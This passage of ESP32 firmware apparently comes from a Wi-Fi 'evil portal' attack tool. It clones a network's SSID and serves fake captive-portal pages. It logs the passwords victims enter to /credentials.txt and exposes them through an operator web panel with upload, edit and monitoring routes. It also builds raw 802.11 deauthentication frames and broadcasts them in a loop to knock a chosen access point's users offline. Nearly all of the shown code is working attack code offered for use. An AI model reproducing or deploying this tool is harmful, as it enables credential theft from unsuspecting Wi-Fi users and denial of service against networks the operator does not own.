      File file = LittleFS.open("/credentials.txt");
      if (file) {
        if (file.size() == 0) {
          server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
        } else {
          server.streamFile(file, "text/plain");
        }
        file.close();
      } else {
        server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      }
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
  });


  server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
  server.on("/download-LittleFS-file", HTTP_GET, handleFileDownload);
  server.on("/list-directories", HTTP_GET, handleListDirectories);

  server.on("/uploadhtmlfile", HTTP_GET, []() {
    if (server.arg("pass") == accessWebPassword) {
      String password = server.arg("pass");
      String html = "<!DOCTYPE html><html><head>";
      html += "<meta charset='UTF-8'>";
      html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
      html += "<title>Upload File</title></head>";
      html += "<body><div class='container'>";
      html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
      html += "<input type='file' name='file' accept='*/*'>";
      html += "Select directory: <select id='dirSelect' name='directory'>";
      html += "<option value='/'>/</option>";
      html += "</select><br>";
      html += "<input type='submit' value='Upload file'>";
      html += "</form>";
      html += "<script>";
      html += "window.onload = function() {";
      html += "    var passValue = '" + password + "';";
      html += "    var dirSelect = document.getElementById('dirSelect');";
      html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
      html += "        .then(response => response.text())";
      html += "        .then(data => {";
      html += "            const dirs = data.split('\\n');";
      html += "            dirs.forEach(dir => {";
      html += "                if (dir.trim() !== '') {";
      html += "                    var option = document.createElement('option');";
      html += "                    option.value = dir;";
      html += "                    option.textContent = dir;";
      html += "                    dirSelect.appendChild(option);";
      html += "                }";
      html += "            });";
      html += "        })";
      html += "        .catch(error => console.error('Error:', error));";
      html += "    var form = document.getElementById('uploadForm');";
      html += "    form.onsubmit = function(event) {";
      html += "        event.preventDefault();";
      html += "        var directory = dirSelect.value;";
      html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
      html += "        form.submit();";
      html += "    };";
      html += "};";
      html += "</script>";
      html += "<style>";
      html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
      html += "</style></body></html>";

      server.send(200, "text/html", html);
    } else {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
  });



  server.on("/upload", HTTP_POST, []() {
    server.send(200);
  }, handleFileUpload);

  server.on("/delete-sd-file", HTTP_GET, handleFileDelete);

  server.on("/setup-portal", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    String portalOptions = "";
    File  root           = LittleFS.open("/");
    int   index          = 0;

    while (File file = root.openNextFile()) {
      if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
        portalFiles[index] = String(file.name()).startsWith("/") ? String(file.name()) : "/" + String(file.name());
        portalOptions += "<option value='" + String(index) + "'>" + file.name() + "</option>";
        index++;
      }
      file.close();
    }
    root.close();

    // Génération de la page HTML avec la liste déroulante pour choisir le fichier de portail
    String html = "<html><head><style>";
    html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
    html += ".container { display: inline-block; background-color: #444; padding: 30px; border-radius: 8px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.3); width: 320px; }";
    html += "input[type='text'], input[type='password'], select, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; box-sizing: border-box; font-size: 16px; background-color: #FFF; color: #333; }";
    html += "button, input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; border-radius: 25px; transition: background-color 0.3s ease; }";
    html += "button:hover, input[type='submit']:hover { background-color: #005F73; }";
    html += "</style></head><body>";

    html += "<div class='container'>";
    html += "<form action='/update-portal-settings' method='get'>";
    html += "<input type='hidden' name='pass' value='" + password + "'>";
    html += "<h2 style='color: #FFF;'>Setup Portal</h2>";
    html += "Portal Name: <br><input type='text' name='newSSID' placeholder='Enter new SSID'><br>";
    html += "New Password (leave empty for open network): <br><input type='password' name='newPassword' placeholder='Enter new Password'><br>";

    // Ajout de la liste déroulante pour sélectionner le fichier de portail par indice
    html += "Select Portal Page: <br><select name='portalIndex'>";
    html += portalOptions;
    html += "</select><br>";

    html += "<input type='submit' value='Save Settings'><br>";
    html += "</form>";

    html += "<div class='button-group'>";
    html += "<a href='/start-portal?pass=" + password + "'><button type='button'>Start Portal</button></a>";
    html += "<a href='/stop-portal?pass=" + password + "'><button type='button'>Stop Portal</button></a>";
    html += "</div>";
    html += "</div></body></html>";

    server.send(200, "text/html", html);
  });


  server.on("/update-portal-settings", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    String newSSID = server.arg("newSSID");
    String newPassword = server.arg("newPassword");
    int portalIndex = server.arg("portalIndex").toInt();  // Récupérer l'indice du fichier sélectionné

    // Logs pour vérifier l'indice reçu
    Serial.println("Updating portal settings...");
    Serial.println("New SSID: " + newSSID);
    Serial.println("New Password: " + newPassword);
    Serial.println("Selected Portal Index: " + String(portalIndex));

    // Mettre à jour le SSID
    if (!newSSID.isEmpty()) {
      cloneSSIDForCaptivePortal(newSSID);
      Serial.println("Portal Name updated: " + newSSID);
    }

    // Mettre à jour le mot de passe
    if (!newPassword.isEmpty()) {
      captivePortalPassword = newPassword;
      Serial.println("Portal Password updated: " + newPassword);
    } else {
      captivePortalPassword = "";  // Réseau ouvert
      Serial.println("Portal is now open (no password).");
    }

    // Appeler `changePortal` avec l'indice
    changePortal(portalIndex);
    saveConfig();
    Serial.println("Portal page updated to index: " + String(portalIndex));

    server.send(200, "text/html", "<html><body><p>Settings updated successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });





  server.on("/start-portal", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    createCaptivePortal();  // Démarrer le portail
    server.send(200, "text/html", "<html><body><p>Portal started successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });

  server.on("/stop-portal", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    stopCaptivePortal();  // Arrêter le portail
    server.send(200, "text/html", "<html><body><p>Portal stopped successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  });


  server.on("/edit-file", HTTP_GET, []() {
    String editFilePassword = server.arg("pass");
    if (editFilePassword != accessWebPassword) {
      Serial.println("Unauthorized access attempt to /edit-file");
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    String editFileName = server.arg("filename");
    if (!editFileName.startsWith("/")) {
      editFileName = "/" + editFileName;
    }

    // Check if the file exists
    if (!LittleFS.exists(editFileName)) {
      Serial.println("File not found: " + editFileName);
      server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    // Open the file for reading
    File editFile = LittleFS.open(editFileName, FILE_READ);
    if (!editFile) {
      Serial.println("Failed to open file for reading: " + editFileName);
      server.send(500, "text/html", "<html><body><p>Failed to open file for reading.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    Serial.println("File opened successfully: " + editFileName);

    // Send HTML header with UTF-8 encoding
    String htmlContent = "<!DOCTYPE html><html><head><meta charset='UTF-8'><style>";
    htmlContent += "textarea { width: 100%; height: 400px; }";
    htmlContent += "button { background-color: #007bff; border: none; color: white; padding: 10px; font-size: 16px; cursor: pointer; margin-top: 10px; }";
    htmlContent += "</style></head><body>";
    htmlContent += "<h3>Editing File: " + editFileName + "</h3>";
    htmlContent += "<form id='editForm' method='post' enctype='multipart/form-data'>";
    htmlContent += "<input type='hidden' name='filename' value='" + editFileName + "'>";
    htmlContent += "<input type='hidden' name='pass' value='" + editFilePassword + "'>";
    htmlContent += "<textarea id='content' name='content'>";

    // Send the initial part of the HTML
    server.sendContent(htmlContent);

    // Send the file content in chunks
    const size_t editFileBufferSize = 512;
    uint8_t editFileBuffer[editFileBufferSize];
    while (editFile.available()) {
      size_t bytesRead = editFile.read(editFileBuffer, editFileBufferSize);
      server.sendContent(String((char*)editFileBuffer).substring(0, bytesRead));
    }
    editFile.close();

    // Complete the HTML
    htmlContent = "</textarea><br>";
    htmlContent += "<button type='button' onclick='submitForm()'>Save</button>";
    htmlContent += "</form>";
    htmlContent += "<script>";
    htmlContent += "function submitForm() {";
    htmlContent += "  var formData = new FormData();";
    htmlContent += "  formData.append('pass', '" + editFilePassword + "');";
    htmlContent += "  formData.append('filename', '" + editFileName + "');";
    htmlContent += "  var blob = new Blob([document.getElementById('content').value], { type: 'text/plain' });";
    htmlContent += "  formData.append('filedata', blob, '" + editFileName + "');";
    htmlContent += "  var xhr = new XMLHttpRequest();";
    htmlContent += "  xhr.open('POST', '/save-file', true);";
    htmlContent += "  xhr.onload = function () {";
    htmlContent += "    if (xhr.status === 200) {";
    htmlContent += "      alert('File saved successfully!');";
    htmlContent += "      window.history.back();";
    htmlContent += "    } else {";
    htmlContent += "      alert('An error occurred while saving the file.');";
    htmlContent += "    }";
    htmlContent += "  };";
    htmlContent += "  xhr.send(formData);";
    htmlContent += "}";
    htmlContent += "</script>";
    htmlContent += "</body></html>";

    // Send the final part of the HTML
    server.sendContent(htmlContent);

    // Close the connection
    server.client().stop();
  });



  server.on("/save-file", HTTP_POST, []() {
    // This is called after the file upload is complete
    if (!isSaveFileAuthorized) {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    } else {
      server.send(200, "text/html", "<html><body><p>File saved successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
    // Reset authorization flag
    isSaveFileAuthorized = false;
  }, handleSaveFileUpload);

  server.on("/monitor-status", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    // Vérification de la connexion Wi-Fi et mise à jour des variables
    if (WiFi.localIP().toString() != "0.0.0.0") {
      wificonnected = true;
      ipAddress = WiFi.localIP().toString();
    } else {
      wificonnected = false;
      ipAddress = "           ";
    }

    // Récupération des informations de monitor
    String ssid = clonedSSID;
    String portalStatus = isCaptivePortalOn ? "On" : "Off";
    String page = selectedPortalFile;
    String wifiStatus = wificonnected ? "Y" : "N";
    String ip = ipAddress;
    int numClients = WiFi.softAPgetStationNum();
    int numPasswords = countPasswordsInFile();
    String stackLeft = getStack();
    String ramUsage = getRamUsage();


    // Génération du HTML pour afficher les informations
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }";
    html += ".container { background-color: #ffffff; padding: 20px 40px; border-radius: 12px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15); width: 90%; max-width: 500px; }";
    html += "h2 { color: #007bff; margin-top: 0; font-size: 24px; text-align: center; }";
    html += ".info { display: flex; justify-content: space-between; margin-bottom: 15px; padding: 10px; background-color: #f7f9fc; border-radius: 6px; border: 1px solid #e1e4e8; }";
    html += ".label { font-weight: bold; color: #333; }";
    html += ".value { color: #666; }";
    html += ".footer { text-align: center; margin-top: 20px; font-size: 14px; color: #999; }";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<h2>Monitor Status</h2>";

    // Informations de statut en blocs organisés
    html += "<div class='info'><span class='label'>SSID:</span><span class='value'>" + ssid + "</span></div>";
    html += "<div class='info'><span class='label'>Portal Status:</span><span class='value'>" + portalStatus + "</span></div>";
    html += "<div class='info'><span class='label'>Page:</span><span class='value'>" + page + "</span></div>";
    html += "<div class='info'><span class='label'>Connected:</span><span class='value'>" + wifiStatus + "</span></div>";
    html += "<div class='info'><span class='label'>IP Address:</span><span class='value'>" + ip + "</span></div>";
    html += "<div class='info'><span class='label'>Clients Connected:</span><span class='value'>" + String(numClients) + "</span></div>";
    html += "<div class='info'><span class='label'>Passwords Count:</span><span class='value'>" + String(numPasswords) + "</span></div>";
    html += "<div class='info'><span class='label'>Stack Left:</span><span class='value'>" + stackLeft + " KB</span></div>";
    html += "<div class='info'><span class='label'>RAM Usage:</span><span class='value'>" + ramUsage + " MB</span></div>";

    // Pied de page
    html += "<div class='footer'>Time Up: " + String(millis() / 1000) + " seconds</div>";
    html += "</div>";
    html += "</body></html>";

    server.send(200, "text/html", html);
  });

  server.on("/deauth-menu", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<p>Unauthorized</p>");
      return;
    }

    // Démarrage du HTML
    String html = "";
    html += "<!DOCTYPE html><html><head><style>";
    html += "body { font-family: Arial, sans-serif; background: #f0f0f0;";
    html += " display: flex; justify-content: center; align-items: center;";
    html += " height: 100vh; margin: 0; }";
    html += ".container { background: white; padding: 30px 40px;";
    html += " border-radius: 12px; box-shadow: 0 6px 12px rgba(0,0,0,0.15);";
    html += " width: 90%; max-width: 500px; max-height: 90vh; }";
    html += "h2 { color: #007bff; margin-top: 0; font-size: 24px;";
    html += " text-align: center; }";
    html += ".ap-list { max-height: 60vh; overflow-y: auto; margin: 20px 0; }";
    html += "form { margin: 5px 0; }";
    html += "button { background-color: #008CBA; border: none; color: white;";
    html += " padding: 12px 20px; font-size: 16px; border-radius: 8px;";
    html += " cursor: pointer; width: 100%; transition: background-color 0.3s; }";
    html += "button:hover { background-color: #005F73; }";
    html += "a { display: block; text-align: center; margin-top: 15px;";
    html += " text-decoration: none; color: #007bff; font-weight: bold; }";
    html += "</style></head><body>";

    // Container principal
    html += "<div class='container'>";
    html += "<h2>Deauth Targets</h2>";

    // Formulaire de sélection
    html += "<form action='/launch-deauth' method='get'>";
    html +=   "<input type='hidden' name='pass' value='" + password + "'>";
    html +=   "<div class='ap-list'>";

    // Liste dynamique des AP
    if (scannedNetworks.empty()) {
      html +=     "<p style='text-align:center;'>No scanned networks. Click scan to refresh.</p>";
    } else {
      for (int i = 0; i < scannedNetworks.size(); ++i) {
        const auto& ap = scannedNetworks[i];
        html +=     "<label style='display:block; padding:5px 0;'>";
        html +=       "<input type='radio' name='index' value='" + String(i) + "'> ";
        html +=       ap.ssid + " (RSSI " + String(ap.rssi) + ", Ch " + String(ap.channel) + ")";
        html +=     "</label>";
      }
    }

    html +=   "</div>";  // .ap-list
    html +=   "<button type='submit' style='margin-top:10px;'>Deauth Selected</button>";
    html += "</form>";

    // Arrêt de l’attaque
    html += "<form action='/stop-deauth' method='get'>";
    html +=   "<input type='hidden' name='pass' value='" + password + "'>";
    html +=   "<button style='background-color:red;'>Stop Deauth</button>";
    html += "</form>";

    // Lien retour
    html += "<a href='/evil-menu?pass=" + password + "'>Back to Menu</a>";
    html += "</div>";  // .container
    html += "</body></html>";

    server.send(200, "text/html", html);
  });

  server.on("/launch-deauth", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<p>Unauthorized</p>");
      return;
    }

    deauthTargets.clear();               // vide la liste

    if (!server.hasArg("index")) {
      server.send(200, "text/html",
                  "<p>No target selected.</p><script>setTimeout(function(){history.back();},2000);</script>");
      return;
    }

    int idx = server.arg("index").toInt();
    if (idx < 0 || idx >= scannedNetworks.size()) {
      server.send(400, "text/html", "<p>Bad index</p>");
      return;
    }

    DeauthTarget t;
    memcpy(t.bssid, WiFi.BSSID(idx), 6);
    t.channel = scannedNetworks[idx].channel;
    deauthTargets.push_back(t);          // taille = 1

    deauthRunning = true;
    server.send(200, "text/html",
                "<p>Deauth started on selected AP.</p><script>setTimeout(function(){history.back();},2000);</script>");
  });



  server.on("/stop-deauth", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<p>Unauthorized</p>");
      return;
    }
    deauthRunning = false;  // stop deauth loop
    server.send(200, "text/html", "<p>Deauth stopped.</p><script>setTimeout(function(){window.history.back();}, 1000);</script>");
  });

  server.on("/reboot", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
      return;
    }

    server.send(200, "text/html", "<html><body><p>Rebooting device...</p></body></html>");
    delay(1000);
    ESP.restart();
  });


  server.on("/favicon.ico", HTTP_GET, []() {
    server.send(404, "text/html", "<html><body><p>Not found.</p></body></html>");
    return;
  });

  server.onNotFound([]() {
    pageAccessFlag = true;
    Serial.println("-------------------");
    Serial.println("Portal Web Access !!!");
    Serial.println("-------------------");
    servePortalFile(selectedPortalFile);
  });

  server.begin();
  Serial.println("-------------------");
  Serial.println("Portal " + clonedSSID + " Deployed with " + selectedPortalFile + " Portal !");
  Serial.println("-------------------");
}

int countPasswordsInFile() {
  File file = LittleFS.open("/credentials.txt");
  if (!file) {
    Serial.println("Error opening credentials file for reading");
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}

String getStack() {
  UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
  return String(stackWordsRemaining * 4 / 1024.0);
}

String getRamUsage() {
  float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0;
  char buffer[10];
  sprintf(buffer, "%.2f", heapSizeInMegabytes);
  return String(buffer);
}

//------------------------------------------------------------------
// ── Deauth ─────────────────────────────────────────────────
//------------------------------------------------------------------

void sendDeauthPacketAuto(uint8_t *apMac, uint8_t channel) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00,             // Type/Sub‑type : Deauthentication (0xC0)
    0x3A, 0x01,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Destination : Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Source : AP MAC (sera remplacé)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID : AP MAC (sera remplacé)
    0x00, 0x00,             // Frag/Seq
    0x07, 0x00              // Reason code : Class 3 frame from non‑associated STA
  };

  // Insère l’adresse MAC de l’AP comme Source et BSSID
  memcpy(&deauthPacket[10], apMac, 6);
  memcpy(&deauthPacket[16], apMac, 6);

  /* ----------  Affichage série pour debug  ---------- */
  Serial.print(F("Deauth AP "));
  for (uint8_t i = 0; i < 6; ++i) {
    if (apMac[i] < 0x10) Serial.print('0');   // garde le format 0x0X
    Serial.print(apMac[i], HEX);
    if (i < 5) Serial.print(':');
  }
  Serial.print(F("  |  Channel "));
  Serial.println(channel);
  /* -------------------------------------------------- */

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);      // Change de canal
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);  // Envoi
}


//------------------------------------------------------------------
// ── SETUP / LOOP ─────────────────────────────────────────────────
//------------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  delay(200);
  initFilesystem();
  scanWiFiNetworks();
  createCaptivePortal();
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
  
  if (deauthRunning) {
    for (auto &t : deauthTargets) {
      sendDeauthPacketAuto((uint8_t*)t.bssid, t.channel);
    }
  }
  delay(100);
}
